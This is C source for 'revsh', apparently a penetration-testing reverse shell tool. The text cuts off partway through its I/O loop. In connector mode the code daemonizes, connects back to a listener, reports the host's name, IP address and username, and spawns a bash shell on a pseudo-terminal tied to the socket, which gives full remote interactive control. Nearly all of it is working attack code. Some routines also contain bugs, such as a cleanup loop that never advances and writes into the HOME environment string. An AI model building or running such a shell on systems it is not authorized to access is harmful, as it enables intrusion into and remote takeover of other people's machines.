
/*******************************************************************************
 *
 * revsh
 *
 * emptymonkey's reverse shell tool with terminal support
 *
 * 2013-07-17
 *
 *
 * The revsh tool is intended to be used as both a listener and remote client
 * in establishing a remote shell with terminal support. This isn't intended
 * as a replacement for netcat, but rather as a supplementary tool to ease 
 * remote interaction during long engagements.
 *
 *******************************************************************************/


//#define DEBUG 


#define _GNU_SOURCE
#define _XOPEN_SOURCE


#include <ctype.h>
#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <netdb.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <termios.h>
#include <unistd.h>

#include <arpa/inet.h>

#include <linux/limits.h>

#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>


#define DEFAULT_SHELL	"/bin/bash"
#define DEFAULT_ENV	"TERM LANG"

#define WINSIZE_BUFF_LEN	16

#define UTF8_HIGH	0xc2
#define APC	0x9f
#define ST	0x9c

// state definitions
#define NO_EVENT				0
#define APC_HIGH_FOUND	1
#define DATA_FOUND			2
#define ST_HIGH_FOUND		3

#define REVSH_DIR ".revsh"
#define RC_FILE	"rc"

volatile sig_atomic_t sig_found = 0;


void usage();
void sig_handler(int signal);
char **string_to_vector(char *command_string);
int io_loop(int local_fd, int remote_fd, int listener);



int main(int argc, char **argv){

	int i, retval, err_flag;

	int opt;
	int listener = 0;
	char *shell = NULL;
	char *env_string = NULL;

	int tmp_fd, sock_fd;
	struct addrinfo *result, *rp;
	struct sockaddr sa;
	socklen_t sa_len;

	char *pty_name;
	int pty_master, pty_slave;
	struct termios saved_termios_attrs, new_termios_attrs;

	char **exec_argv;
	char **exec_envp;
	char **tmp_vector;

	int buff_len, tmp_len;
	char *buff_head, *buff_tail;
	char *tmp_ptr;

	int io_bytes;

	struct winsize tty_winsize;

	char tmp_char;


	while((opt = getopt(argc, argv, "ls:e:")) != -1){
		switch(opt){

			case 'l':
				listener = 1;
				break;

			case 'e':
				env_string = optarg;
				break;

			case 's':
				shell = optarg;
				break;

			default:
				usage();
		}
	}


	if((argc - optind) != 2){
		usage();
	}


	buff_len = getpagesize();
	if((buff_head = (char *) calloc(buff_len, sizeof(char))) == NULL){
		error(-1, errno, "calloc(%d, %d)", buff_len, (int) sizeof(char));
	}

	/*
	 * Listener:
	 * - Open a socket.
	 * - Listen for a connection.
	 * - Send initial shell data.
	 * - Send initial environment data.
	 * - Send initial termios data.
	 * - Set local terminal to raw. 
	 * - Enter io_loop() for data brokering.
	 * - Reset local term.
	 * - Exit.
	 */
	if(listener){

		// - Open a socket.
		if((retval = getaddrinfo(argv[optind], argv[optind + 1], NULL, &result))){
			error(-1, 0, "getaddrinfo(%s, %s, NULL, %lx): %s", argv[optind], \
					argv[optind + 1], (unsigned long) &result, gai_strerror(retval));
		}

		opt = 1;
		for(rp = result; rp != NULL; rp = rp->ai_next){
			if((sock_fd = socket(result->ai_family, result->ai_socktype, \
							result->ai_protocol)) == -1){
				continue;
			}
			if((retval = setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &opt, \
							sizeof(int))) != -1){

				if((retval = bind(sock_fd, result->ai_addr, result->ai_addrlen)) == 0){
					break;
				}
			}
			close(sock_fd);
		}

		if(rp == NULL){
			error(-1, 0, "Unable to bind to: %s %s\n", argv[optind], argv[optind + 1]);
		}

		// - Listen for a connection.
		printf("Listening...");
		fflush(stdout);

		if((retval = listen(sock_fd, 1)) == -1){
			error(-1, errno, "listen(%d, 1)", sock_fd);
		}
		if((tmp_fd = accept(sock_fd, result->ai_addr, &(result->ai_addrlen))) == -1){
			error(-1, errno, "accept(%d, %lx, %lx)", sock_fd, \
					(unsigned long) result->ai_addr, (unsigned long) &(result->ai_addrlen));
		}

		if((retval = close(sock_fd)) == -1){
			error(-1, errno, "close(%d)", sock_fd);
		}
		sock_fd = tmp_fd;

		freeaddrinfo(result);

		printf("\tConnected!\r\n");
		fflush(stdout);

		printf("Initializing...");
		fflush(stdout);

		// - Send initial shell data.
		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;
		*(buff_tail++) = (char) APC;
		if(shell){
			tmp_len = strlen(shell);
			memcpy(buff_tail, shell, tmp_len);
		}else{
			tmp_len = strlen(DEFAULT_SHELL);
			memcpy(buff_tail, DEFAULT_SHELL, tmp_len);
		}
		buff_tail += tmp_len;

		*(buff_tail++) = (char) ST;

		if((buff_tail - buff_head) >= buff_len){
			error(-1, 0, "Environment string too long.");
		}

		tmp_len = strlen(buff_head);
		if((io_bytes = write(sock_fd, buff_head, tmp_len)) == -1){
			error(-1, errno, "write(%d, %lx, %d)", \
					sock_fd, (unsigned long) buff_head, tmp_len);
		}

		if(io_bytes != (buff_tail - buff_head)){
			error(-1, 0, "write(%d, %lx, %d): Unable to write entire string.", \
					sock_fd, (unsigned long) buff_head, buff_len);
		}

		// - Send initial environment data.
		if(!env_string){
			tmp_len = strlen(DEFAULT_ENV);
			if((env_string = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
				error(-1, errno, "calloc(strlen(%d, %d))", \
						tmp_len + 1, (int) sizeof(char));
			}

			memcpy(env_string, DEFAULT_ENV, tmp_len);
		}

		tmp_ptr = env_string;
		while((tmp_ptr = strchr(tmp_ptr, ','))){
			*tmp_ptr = ' ';
		}

		if((exec_envp = string_to_vector(env_string)) == NULL){
			error(-1, errno, "string_to_vector(%s)", env_string);
		}

		buff_tail = buff_head;
		*(buff_tail++) = (char) APC;

		for(i = 0; exec_envp[i]; i++){

			if((buff_tail - buff_head) >= buff_len){
				error(-1, 0, "Environment string too long.");
			}else if(buff_tail != (buff_head + 1)){
				*(buff_tail++) = ' ';
			}

			tmp_len = strlen(exec_envp[i]);
			memcpy(buff_tail, exec_envp[i], tmp_len);

			buff_tail += tmp_len;

			*(buff_tail++) = '=';

			if((tmp_ptr = getenv(exec_envp[i])) == NULL){
				fprintf(stderr, "%s: No such environment variable \"%s\". Ignoring.\n", \
						program_invocation_short_name, exec_envp[i]);
			}else{
				tmp_len = strlen(tmp_ptr);
				memcpy(buff_tail, tmp_ptr, tmp_len);
				buff_tail += tmp_len;
			}
		}

		*(buff_tail++) = (char) ST;

		if((buff_tail - buff_head) >= buff_len){
			error(-1, 0, "Environment string too long.");
		}

		tmp_len = strlen(buff_head);
		if((io_bytes = write(sock_fd, buff_head, tmp_len)) == -1){
			error(-1, errno, "write(%d, %lx, %d)", \
					sock_fd, (unsigned long) buff_head, tmp_len);
		}

		if(io_bytes != (buff_tail - buff_head)){
			error(-1, 0, "write(%d, %lx, %d): Unable to write entire string.", \
					sock_fd, (unsigned long) buff_head, buff_len);
		}


		// - Send initial termios data.
		if((retval = ioctl(STDIN_FILENO, TIOCGWINSZ, &tty_winsize)) == -1){
			error(-1, errno, "ioctl(STDIN_FILENO, TIOCGWINSZ, %lx)", \
					(unsigned long) &tty_winsize);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;
		*(buff_tail++) = (char) APC;

		if((retval = snprintf(buff_tail, buff_len - 2, "%hd %hd", \
						tty_winsize.ws_row, tty_winsize.ws_col)) < 0){
			error(-1, errno, "snprintf(buff_head, buff_len, \"%%hd %%hd\", %hd, %hd)", \
					tty_winsize.ws_row, tty_winsize.ws_col);
		}

		buff_tail += retval;
		*(buff_tail++) = (char) ST;

		tmp_len = strlen(buff_head);
		if((io_bytes = write(sock_fd, buff_head, tmp_len)) == -1){
			error(-1, errno, "write(%d, %lx, %d)", \
					sock_fd, (unsigned long) buff_head, tmp_len);
		}

		if(io_bytes != tmp_len){
			error(-1, 0, "write(%d, %lx, %d): Unable to write entire string.", \
					sock_fd, (unsigned long) buff_head, tmp_len);
		}

		// - Set local terminal to raw. 
		if((retval = tcgetattr(STDIN_FILENO, &saved_termios_attrs)) == -1){
			error(-1, errno, "tcgetattr(STDIN_FILENO, %lx)", \
					(unsigned long) &saved_termios_attrs);
		}

		memcpy(&new_termios_attrs, &saved_termios_attrs, sizeof(struct termios));

		new_termios_attrs.c_lflag &= ~(ECHO|ICANON|IEXTEN|ISIG);
		new_termios_attrs.c_iflag &= ~(BRKINT|ICRNL|INPCK|ISTRIP|IXON);
		new_termios_attrs.c_cflag &= ~(CSIZE|PARENB);
		new_termios_attrs.c_cflag |= CS8;
		new_termios_attrs.c_oflag &= ~(OPOST);

		new_termios_attrs.c_cc[VMIN] = 1;
		new_termios_attrs.c_cc[VTIME] = 0;

		if((retval = tcsetattr(STDIN_FILENO, TCSANOW, &new_termios_attrs)) == -1){
			error(-1, errno, "tcsetattr(STDIN_FILENO, TCSANOW, %lx)", \
					(unsigned long) &new_termios_attrs);
		}	

		printf("\tDone!\r\n");
		fflush(stdout);

		errno = 0;
		// - Enter io_loop() for data brokering.
		if((retval = io_loop(STDIN_FILENO, sock_fd, listener) == -1)){
			fprintf(stderr, "%s: io_loop(%d, %d, %d): %s\r\n", \
					program_invocation_short_name, STDIN_FILENO, sock_fd, listener,
					strerror(errno));
		}

		err_flag = 0;
		if(errno == ECONNRESET){
			err_flag = errno;
		}

		// - Reset local term.
		tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios_attrs);

		// - Exit.
		if(!err_flag){
			printf("Good-bye!\n");

		}else{
			while((retval = read(sock_fd, buff_head, buff_len)) > 0){
				write(STDERR_FILENO, buff_head, retval);
			}
		}

		return(0);

	}else{

		/*
		 * Connector: 
		 * - Become a daemon.
		 * - Open a network connection back to a listener.
		 * - Check for usage and exit, if needed. 
		 * - Receive and set the shell.
		 * - Receive and set the initial environment.
		 * - Receive and set the initial termios.
		 * - Create a pseudo-terminal (pty).
		 * - Send basic information back to the listener about the connecting host.
		 * - Fork a child to run the shell.
		 * - Parent: Enter the io_loop() and broker data.
		 * - Child: Initialize file descriptors.
		 * - Child: Set the pty as controlling.
		 * - Child: Call execve() to invoke a shell.
		 */


		// - Become a daemon.
		umask(0);


#ifndef DEBUG
		retval = fork();

		if(retval == -1){
			error(-1, errno, "fork()");
		}else if(retval){
			exit(0);
		}

		if((retval = setsid()) == -1){
			error(-1, errno, "setsid()");
		}

		if((retval = chdir("/")) == -1){
			error(-1, errno, "chdir(\"/\")");
		}
#endif

		// - Open a network connection back to a listener.
		if((retval = getaddrinfo(argv[optind], argv[optind + 1], NULL, &result))){
			error(-1, 0, "getaddrinfo(%s, %s, NULL, %lx): %s", argv[optind], \
					argv[optind + 1], (unsigned long) &result, gai_strerror(retval));
		}

		opt = 1;
		for(rp = result; rp != NULL; rp = rp->ai_next){
			if((sock_fd = socket(result->ai_family, result->ai_socktype, \
							result->ai_protocol)) == -1){
				continue;
			}
			if((retval = setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &opt, \
							sizeof(int))) != -1){
				if((retval = connect(sock_fd, result->ai_addr, \
								result->ai_addrlen)) == 0){
					break;
				}
			}
			close(sock_fd);
		}

		if(rp == NULL){
			error(-1, 0, "Unable to bind to: %s %s\n", argv[optind], argv[optind + 1]);
		}

		if((retval = close(STDIN_FILENO)) == -1){
			error(-1, errno, "close(STDIN_FILENO)");
		}

		if((retval = close(STDOUT_FILENO)) == -1){
			error(-1, errno, "close(STDOUT_FILENO)");
		}

#ifndef DEBUG
		if((retval = close(STDERR_FILENO)) == -1){
			error(-1, errno, "close(STDERR_FILENO)");
		}

		if((retval = dup2(sock_fd, STDERR_FILENO)) == -1){
			exit(-2);
		}

#endif

		if((retval = dup2(sock_fd, STDOUT_FILENO)) == -1){
			error(-1, errno, "dup2(%d, STDOUT_FILENO)", sock_fd);
		}

		// - Check for usage and exit, if needed. 
		// We do this after the network connect so the error
		// reporting gets sent back to the listener, if possible.
		if(shell || env_string){

			fprintf(stderr, \
					"\r%s: remote usage error: Only listeners can invoke -s or -e!\r\n", \
					program_invocation_short_name);
			fflush(stderr);
			exit(-1);
		}

		// - Receive and set the shell.
		if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
			error(-1, errno, "read(%d, %lx, %d)", \
					sock_fd, (unsigned long) &tmp_char, 1);
		}

		if(tmp_char != (char) APC){
			error(-1, 0, "invalid initialization: shell");
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;

		if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
			error(-1, errno, "read(%d, %lx, %d)", \
					sock_fd, (unsigned long) &tmp_char, 1);
		}

		while(tmp_char != (char) ST){
			*(buff_tail++) = tmp_char;

			if((buff_tail - buff_head) >= buff_len){
				error(-1, 0, "Shell string too long.");
			}

			if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
				error(-1, errno, "read(%d, %lx, %d)", \
						sock_fd, (unsigned long) &tmp_char, 1);
			}
		}

		tmp_len = strlen(buff_head);
		if((shell = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
			error(-1, errno, "calloc(%d, %d)", \
					tmp_len + 1, (int) sizeof(char));
		}
		memcpy(shell, buff_head, tmp_len);


		// - Receive and set the initial environment.
		if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
			error(-1, errno, "read(%d, %lx, %d)", \
					sock_fd, (unsigned long) &tmp_char, 1);
		}

		if(tmp_char != (char) APC){
			error(-1, 0, "invalid initialization: environment");
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;

		if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
			error(-1, errno, "read(%d, %lx, %d)", \
					sock_fd, (unsigned long) &tmp_char, 1);
		}

		while(tmp_char != (char) ST){
			*(buff_tail++) = tmp_char;

			if((buff_tail - buff_head) >= buff_len){
				error(-1, 0, "Environment string too long.");
			}

			if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
				error(-1, errno, "read(%d, %lx, %d)", \
						sock_fd, (unsigned long) &tmp_char, 1);
			}
		}

		if((exec_envp = string_to_vector(buff_head)) == NULL){
			error(-1, errno, "string_to_vector(%s)", buff_head);
		}

		// - Receive and set the initial termios.
		if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
			error(-1, errno, "read(%d, %lx, %d)", \
					sock_fd, (unsigned long) &tmp_char, 1);
		}

		if(tmp_char != (char) APC){
			error(-1, 0, "invalid initialization: termios");
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;

		if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
			error(-1, errno, "read(%d, %lx, %d)", \
					sock_fd, (unsigned long) &tmp_char, 1);
		}

		while(tmp_char != (char) ST){
			*(buff_tail++) = tmp_char;

			if((buff_tail - buff_head) >= buff_len){
				error(-1, 0, "termios string too long.");
			}

			if((io_bytes = read(sock_fd, &tmp_char, 1)) == -1){
				error(-1, errno, "read(%d, %lx, %d)", \
						sock_fd, (unsigned long) &tmp_char, 1);
			}
		}

		if((tmp_vector = string_to_vector(buff_head)) == NULL){
			error(-1, errno, "string_to_vector(%s)", buff_head);
		}

		if(tmp_vector[0] == NULL){
			error(-1, 0, "invalid initialization: tty_winsize.ws_row");
		}

		errno = 0;
		tty_winsize.ws_row = strtol(tmp_vector[0], NULL, 10);
		if(errno){
			error(-1, errno, "strtol(%s)", tmp_vector[0]);
		}

		if(tmp_vector[1] == NULL){
			error(-1, 0, "invalid initialization: tty_winsize.ws_col");
		}

		errno = 0;
		tty_winsize.ws_col = strtol(tmp_vector[1], NULL, 10);
		if(errno){
			error(-1, errno, "strtol(%s)", tmp_vector[1]);
		}

		// - Create a pseudo-terminal (pty).
		if((pty_master = posix_openpt(O_RDWR|O_NOCTTY)) == -1){
			error(-1, errno, "posix_openpt(O_RDWR|O_NOCTTY)");
		}

		if((retval = grantpt(pty_master)) == -1){
			error(-1, errno, "grantpt(%d)", pty_master);
		}

		if((retval = unlockpt(pty_master)) == -1){
			error(-1, errno, "unlockpt(%d)", pty_master);
		}

		if((retval = ioctl(pty_master, TIOCSWINSZ, &tty_winsize)) == -1){
			error(-1, errno, "ioctl(%d, %d, %lx)", \
					pty_master, TIOCGWINSZ, (unsigned long) &tty_winsize);
		}

		if((pty_name = ptsname(pty_master)) == NULL){
			error(-1, errno, "ptsname(%d)", pty_master);
		}

		if((pty_slave = open(pty_name, O_RDWR|O_NOCTTY)) == -1){
			error(-1, errno, "open(%s, O_RDWR|O_NOCTTY)", pty_name);
		}

		// - Send basic information back to the listener about the connecting host.
		//   (e.g. hostname, ip address, username)
		memset(buff_head, 0, buff_len);
		if((retval = gethostname(buff_head, buff_len - 1)) == -1){
			error(-1, errno, "gethostname(%lx, %d)", \
					(unsigned long) buff_head, buff_len - 1);
		}

		printf("################################\r\n");
		printf("# hostname: %s\r\n", buff_head);

		memset(buff_head, 0, buff_len);
		memset(&sa, 0, sizeof(sa));
		sa_len = sizeof(sa);
		if((retval = getsockname(sock_fd, &sa, &sa_len)) == -1){
			error(-1, errno, "getsockname(%d, %lx, %lx)", \
					sock_fd, (unsigned long) &sa, (unsigned long) &sa_len);
		}

		memset(buff_head, 0, buff_len);
		switch(rp->ai_family){
			case AF_INET:
				if(inet_ntop(rp->ai_family, &(((struct sockaddr_in *) &sa)->sin_addr), \
							buff_head, buff_len - 1) == NULL){
					error(-1, errno, "inet_ntop(%d, %lx, %lx, %d)", \
							rp->ai_family, (unsigned long) &(sa.sa_data), \
							(unsigned long) buff_head, buff_len - 1);
				}
				break;

			case AF_INET6:
				if(inet_ntop(rp->ai_family, &(((struct sockaddr_in6 *) &sa)->sin6_addr), \
							buff_head, buff_len - 1) == NULL){
					error(-1, errno, "inet_ntop(%d, %lx, %lx, %d)", \
							rp->ai_family, (unsigned long) &(sa.sa_data), \
							(unsigned long) buff_head, buff_len - 1);
				}
				break;

			default:
				error(-1, 0, "unknown ai_family: %d\r\n", rp->ai_family);
		}
		freeaddrinfo(result);

		printf("# ip address: %s\r\n", buff_head);
		printf("# username: %s\r\n", getenv("LOGNAME"));
		printf("################################\r\n");
		fflush(stdout);

		// - Fork a child to run the shell.
		retval = fork();

		if(retval == -1){
			error(-1, errno, "fork()");
		}

		if(retval){

			// - Parent: Enter the io_loop() and broker data.
			if((retval = close(pty_slave)) == -1){
				error(-1, errno, "close(%d)", pty_slave);
			}

			retval = io_loop(pty_master, sock_fd, listener);

#ifdef debug
			if((retval == -1)){
				error(-1, errno, "io_loop(%d, %d, %d)", pty_master, sock_fd, listener);
			}
#endif

			return(0);
		}

		// - Child: Initialize file descriptors.
		if((retval = close(pty_master)) == -1){
			error(-1, errno, "close(%d)", pty_master);
		}

		if((retval = close(sock_fd)) == -1){
			error(-1, errno, "close(%d)", pty_master);
		}

		if((retval = dup2(pty_slave, STDIN_FILENO)) == -1){
			error(-1, errno, "dup2(%d, STDIN_FILENO)", pty_slave);
		}

		if((retval = dup2(pty_slave, STDOUT_FILENO)) == -1){
			error(-1, errno, "dup2(%d, STDOUT_FILENO)", pty_slave);
		}

		if((retval = close(STDERR_FILENO)) == -1){
			error(-1, errno, "close(%d)", pty_master);
		}

		if((retval = dup2(pty_slave, STDERR_FILENO)) == -1){
			exit(-2);
		}

		if((retval = close(pty_slave)) == -1){
			error(-1, errno, "close(%d)", pty_slave);
		}

		if((retval = setsid()) == -1){
			error(-1, errno, "setsid()");
		} 

		// - Child: Set the pty as controlling.
		if((retval = ioctl(STDIN_FILENO, TIOCSCTTY, 1)) == -1){
			error(-1, errno, "ioctl(STDIN_FILENO, TIOCSCTTY, 1)");
		}

		// - Child: Call execve() to invoke a shell.
		errno = 0;
		if((exec_argv = string_to_vector(shell)) == NULL){
			error(-1, errno, "string_to_vector(%s)", shell);
		}

		execve(exec_argv[0], exec_argv, exec_envp);
		error(-1, errno, "execve(%s, %lx, NULL): shouldn't be here.", \
				exec_argv[0], (unsigned long) exec_argv);

	}

	return(-1);
}


/*******************************************************************************
 *
 * usage()
 *
 * Input: None.
 * Output: None.
 *
 * Purpose: Educate the user as to the error of their ways.
 *
 ******************************************************************************/
void usage(){
	fprintf(stderr, "\nusage: %s [-l [-e ENV_ARGS] [-s SHELL]] ADDRESS PORT\n", \
			program_invocation_short_name);
	fprintf(stderr, "\n\t-l: Setup a listener.\n");
	fprintf(stderr, "\t-e ENV_ARGS: Export ENV_ARGS to the remote shell. (Defaults are \"TERM\" and \"LANG\".)\n");
	fprintf(stderr, "\t-s SHELL: Invoke SHELL as the remote shell. (Default is /bin/bash.)\n");
	fprintf(stderr, "\n\tNote: '-e' and '-s' only work with a listener.\n\n");

	exit(-1);
}


/*******************************************************************************
 * 
 * signal_handler()
 *
 * Input: The signal being handled.
 * Output: None. 
 * 
 * Purpose: To handle signals! For best effort at avoiding race conditions,
 *  we simply mark that the signal was found and return. This allows the
 *  io_loop() select() call to manage signal generating events.
 * 
 ******************************************************************************/
void signal_handler(int signal){
	sig_found = signal;
}


/*******************************************************************************
 *
 * string_to_vector()
 *
 * Input: A string of tokens, whitespace delimited, null terminated.
 * Output: An array of strings containing the tokens. The array itself is 
 *  also null terminated. NULL will be returned on error.
 *
 * Purpose: Tokenize a string for later consumption. 
 *  (In this case, we are performing serialization of data for use with
 *  in-band signalling by converting the data into a whitespace delimited
 *  string for transmission.)
 *
 ******************************************************************************/
char **string_to_vector(char *command_string){

	int was_space = 1;
	int count = 0;
	int i, len;

	char *index;
	char *token_start = NULL;

	char **argv;

	index = command_string;
	while(*index){

		// Lets step through the string and look for tokens. We aren't grabbing them
		// yet, just counting them.
		// Note, we are looking at the transition boundaries from space->!space and
		// !space->space to define the token. "count" will denote these transitions.
		// An odd count implies that we are in a token. An even count implies we are
		// between tokens.
		if(isspace(*index)){
			if(!was_space){
				// end of a token.
				count++;
			}
			was_space = 1;
		}else{
			if(was_space){
				// start of a token.
				count++;
			}
			was_space = 0;
		}
		index++;
	}

	// Don't forget to account for the case where the last token is up against the
	// '\0' terminator with no space between.
	if(count % 2){
		count++;
	}

	// Now, (count / 2) will be the number of tokens.
	// Since we know the number of tokens, lets setup argv.
	if((argv = (char **) malloc((sizeof(char *) * ((count / 2) + 1)))) == NULL){
#ifdef DEBUG
		fprintf(stderr, "%s: string_to_vector(): malloc(%d): %s\r\n", \
				program_invocation_short_name, \
				(int) ((sizeof(char *) * ((count / 2) + 1))), strerror(errno));
#endif
		return(NULL);
	}
	memset(argv, 0, (sizeof(char *) * ((count / 2) + 1)));

	// Now, let's do that loop again, this time saving the tokens.
	i = 0;
	len = 0;
	count = 0;
	was_space = 1;
	index = command_string;
	while(*index){
		if(isspace(*index)){
			if(!was_space){
				// end of a token.
				if((argv[i] = (char *) malloc(sizeof(char) * (len + 1))) == NULL){
#ifdef DEBUG
					fprintf(stderr, "%s: string_to_vector(): malloc(%d): %s\r\n", \
							program_invocation_short_name, \
							(int) (sizeof(char) * (len + 1)), strerror(errno));
#endif
					goto CLEAN_UP;
				}
				memset(argv[i], 0, sizeof(char) * (len + 1));
				memcpy(argv[i], token_start, sizeof(char) * len);
				i++;
				len = 0;
				count++;
			}
			was_space = 1;
		}else{
			if(was_space){
				// start of a token.
				count++;
				token_start = index;
			}
			len++;
			was_space = 0;
		}
		index++;
	}

	// Same final token termination case.
	if(count % 2){
		if((argv[i] = malloc(sizeof(char) * (len + 1))) == NULL){
#ifdef DEBUG
			fprintf(stderr, "%s: string_to_vector(): malloc(%d): %s\r\n", \
					program_invocation_short_name, \
					(int) (sizeof(char) * (len + 1)), strerror(errno));
#endif
			goto CLEAN_UP;
		}
		memset(argv[i], 0, sizeof(char) * (len + 1));
		memcpy(argv[i], token_start, sizeof(char) * len);
	}

	return(argv);

CLEAN_UP:
	i = 0;
	while(argv[i]){
		free(argv[i]);
	}

	free(argv);
	return(NULL);
}


/*******************************************************************************
 *
 * io_loop()
 *
 * Input: Two file descriptors. Also, an indication of whether or not we are a
 *  listener.
 * Output: 0 for EOF, -1 for errors.
 *
 * Purpose: Broker data between the two file descriptors. Also, handle some 
 *  signal events (e.g. SIGWINCH) with in-band signalling.
 *
 ******************************************************************************/
int io_loop(int local_fd, int remote_fd, int listener){

	int retval = -1;
	fd_set fd_select;
	int io_bytes, fd_max;

	int buff_len;
	char *buff_head = NULL;
	char *buff_tail = NULL;

	// APC (0x9f) and ST (0x9c) are 8 bit control characters. These pointers will
	// point to their location in a string, if found.
	// Using APC here as start of an in-band signalling event, and ST to mark
	// the end.
	// 
	// EDIT: Added UTF8_HIGH to the APC and ST characters to ensure the in-band signalling can coexist with utf8 data.
	//	We don't bother with the UTF8_HIGH parts before the io_loop() because they don't intermingle with user 
	//	generated data at that point.
	char *event_ptr = NULL;

	struct sigaction act;
	int current_sig;

	struct winsize tty_winsize;
	int winsize_buff_len;
	char *winsize_buff_head, *winsize_buff_tail;
	char **winsize_vec;
	int sig_pid;

	char tmp_char;
	int tmp_len;

	int state_counter;

	char *rc_file_head, *rc_file_tail;
	int rc_file_fd;


	if(listener){
		memset(&act, 0, sizeof(act));
		act.sa_handler = signal_handler;

		if((retval = sigaction(SIGWINCH, &act, NULL)) == -1){
#ifdef DEBUG
			fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
					program_invocation_short_name, listener, \
					SIGWINCH, (unsigned long) &act, NULL, strerror(errno));
#endif
			goto CLEAN_UP;
		}
	}

	// One buffer for reads + writes.
	buff_len = getpagesize();
	buff_head = (char *) calloc(buff_len, sizeof(char));

	// And one buffer for dealing with serialization and transmission / receipt
	// of a struct winsize. This probably only needs to be 14 chars long.
	// 2 control chars + 1 space + (2 * string length of winsize members).
	// winsize members are unsigned shorts on my dev platform.
	// There are four members total, but the second two are ignored.
	winsize_buff_len = WINSIZE_BUFF_LEN;
	winsize_buff_head = (char *) calloc(winsize_buff_len, sizeof(char));


	// Let's add support for .revsh/rc files here! :D
	if(listener){
		
		if((rc_file_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
			fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
					program_invocation_short_name, listener, PATH_MAX, (int) sizeof(char), \
					strerror(errno));
			retval = -1;
			goto CLEAN_UP;
		}

		rc_file_head = getenv("HOME");

		rc_file_tail = index(rc_file_head, '\0');
		*(rc_file_tail++) = '/';	
		sprintf(rc_file_tail, REVSH_DIR);
		rc_file_tail = index(rc_file_head, '\0');
		*(rc_file_tail++) = '/';	
		sprintf(rc_file_tail, RC_FILE);


		if((rc_file_fd = open(rc_file_head, O_RDONLY)) != -1){

			while((io_bytes = read(rc_file_fd, buff_head, buff_len))){
				if(io_bytes == -1){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: io_loop(): read(%d, %lx, %d): %s\r\n", \
							program_invocation_short_name, listener, \
							rc_file_fd, (unsigned long) buff_head, buff_len, strerror(errno));
#endif
					retval = -1;
					goto CLEAN_UP;
				}

				if(!io_bytes){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: io_loop(): read(%d, %lx, %d): A OK!\r\n", \
							program_invocation_short_name, listener, \
							rc_file_fd, (unsigned long) buff_head, buff_len);
#endif
					retval = 0;
					goto CLEAN_UP;
				}

				if((retval = write(remote_fd, buff_head, io_bytes)) == -1){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
							program_invocation_short_name, listener, \
							remote_fd, (unsigned long) buff_head, io_bytes, strerror(errno));
#endif
					goto CLEAN_UP;
				}

				if(retval != io_bytes){
#ifdef DEBUG
					fprintf(stderr, \
							"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
							program_invocation_short_name, listener, \
							remote_fd, (unsigned long) buff_head, io_bytes, retval, io_bytes);
#endif
					retval = -1;
					goto CLEAN_UP;
				}

			}

			close(rc_file_fd);

		}

	}


	// select() loop for multiplexed blocking io.
	while(1){
		FD_ZERO(&fd_select);
		FD_SET(local_fd, &fd_select);
		FD_SET(remote_fd, &fd_select);

		fd_max = (local_fd > remote_fd) ? local_fd : remote_fd;

		if(((retval = select(fd_max + 1, &fd_select, NULL, NULL, NULL)) == -1) \
				&& !sig_found){
#ifdef DEBUG
			fprintf(stderr, \
					"%s: %d: io_loop(): select(%d, %lx, NULL, NULL, NULL): %s\r\n", \
					program_invocation_short_name, listener, remote_fd + 1, \
					(unsigned long) &fd_select, strerror(errno));
#endif
			goto CLEAN_UP;
		}

		// Case 1: select() was interrupted by a signal that we handle.
		if(sig_found){

			current_sig = sig_found;
			sig_found = 0;

			// leaving this as a switch() statement in case I decide to
			// handle more signals later on.
			switch(current_sig){

				case SIGWINCH:
					if((retval = ioctl(local_fd, TIOCGWINSZ, &tty_winsize)) == -1){
#ifdef DEBUG
						fprintf(stderr, "%s: %d: ioctl(%d, TIOCGWINSZ, %lx): %s\r\n", \
								program_invocation_short_name, listener, \
								local_fd, (unsigned long) &tty_winsize, strerror(errno));
#endif
						goto CLEAN_UP;
					}

					memset(winsize_buff_head, 0, winsize_buff_len);
					if((io_bytes = snprintf(winsize_buff_head, winsize_buff_len - 1, \
									"%c%c%hd %hd%c%c", (char) UTF8_HIGH, (char) APC, tty_winsize.ws_row, \
									tty_winsize.ws_col, (char) UTF8_HIGH, (char) ST)) < 0){
#ifdef DEBUG
						fprintf(stderr, \
								"%s: %d: snprintf(winsize_buff_head, winsize_buff_len, \"%%c%%hd %%hd%%c\", APC, %hd, %hd, ST): %s\r\n", \
								program_invocation_short_name, listener, \
								tty_winsize.ws_row, tty_winsize.ws_col, strerror(errno));
#endif
						retval = -1;
						goto CLEAN_UP;
					}

					if((retval = write(remote_fd, winsize_buff_head, io_bytes)) == -1){
#ifdef DEBUG
						fprintf(stderr, "%s: %d: write(%d, %lx, %d): %s\r\n", \
								program_invocation_short_name, listener, \
								remote_fd, (unsigned long) winsize_buff_head, io_bytes, \
								strerror(errno));
#endif
						goto CLEAN_UP;
					}

					if(retval != io_bytes){
#ifdef DEBUG
						fprintf(stderr, \
								"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
